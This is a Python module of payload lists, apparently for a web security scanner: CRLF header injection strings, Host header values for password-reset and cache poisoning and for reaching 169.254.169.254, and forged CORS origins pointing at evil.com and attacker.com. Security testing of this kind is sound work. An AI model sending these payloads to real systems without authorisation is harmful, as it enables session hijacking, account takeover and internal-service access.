"""headers.py — HTTP Header Injection & CORS Payloads"""

# ─────────────────────────────────────────────
# Header Injection (CRLF)
# ─────────────────────────────────────────────
HEADER_INJECTION_PAYLOADS: list[str] = [
    # CRLF injection
    "\r\nX-Injected: header",
    "\r\nSet-Cookie: malicious=true",
    "\r\nLocation: https://evil.com",
    "%0d%0aX-Injected: header",
    "%0d%0aSet-Cookie: malicious=true",
    "%0aX-Injected: header",
    "%0aSet-Cookie: malicious=true",
    "%0d%0a%0d%0a<html>Injected</html>",
    "\\r\\nX-Injected: header",
    "\\nX-Injected: header",
    "\nX-Injected: header",
    "\n\rX-Injected: header",
    # Double encoding
    "%250d%250aX-Injected: header",
    "%0D%0AX-Injected: header",
    # Unicode
    "\u000d\u000aX-Injected: header",
    # Cache poisoning via headers
    "\r\nCache-Control: no-cache",
    "%0d%0aTransfer-Encoding: chunked",
]

# ─────────────────────────────────────────────
# Host Header Attacks
# ─────────────────────────────────────────────
HOST_HEADER_PAYLOADS: list[str] = [
    # Password reset poisoning
    "evil.com",
    "evil.com:80",
    "legitimate.com:80@evil.com",
    "legitimate.com.evil.com",
    "legitimate.com\@evil.com",
    "legitimate.com evil.com",
    "evil.com:fake-port",
    # Cache poisoning
    "evil.com",
    "legitimate.com:evil.com",
    "legitimate.com:80",
    # X-Forwarded-Host injection
    "X-Forwarded-Host: evil.com",
    "X-Host: evil.com",
    "X-Forwarded-Server: evil.com",
    # Internal host bypass
    "localhost",
    "127.0.0.1",
    "169.254.169.254",
    "0.0.0.0",
    # SSRF via Host
    "burpcollaborator.net",
    "evil.com:443",
]

# ─────────────────────────────────────────────
# CORS Misconfiguration Testing
# ─────────────────────────────────────────────
CORS_PAYLOADS: list[str] = [
    # Null origin
    "null",
    # Subdomain bypass
    "https://evil.legitimate.com",
    "https://legitimate.com.evil.com",
    # Protocol confusion
    "http://legitimate.com",  # Force http: where https expected
    # Trusted domain with malicious subdomain
    "https://evil.legitimate.com",
    "https://notlegitimate.com",
    # Regex bypass
    "https://legitimateScom",
    "https://legitimate.com.attacker.com",
    # Any origin
    "https://attacker.com",
    "http://attacker.com",
    # Internal
    "http://localhost",
    "http://127.0.0.1",
    "null",
]
